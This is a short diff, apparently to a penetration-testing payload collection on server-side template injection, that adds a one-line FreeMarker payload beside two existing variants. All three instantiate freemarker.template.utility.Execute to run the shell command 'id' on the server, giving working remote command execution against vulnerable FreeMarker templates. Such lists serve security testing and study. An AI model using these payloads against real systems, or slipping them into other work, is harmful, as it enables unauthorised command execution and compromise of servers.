@@ -150,6 +150,7 @@ The template can be `${3*3}` or the legacy `#{3*3}`
 ```js
 <#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
 [#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
+${"freemarker.template.utility.Execute"?new()("id")}
 ```
 
 ## Jade / Codepen
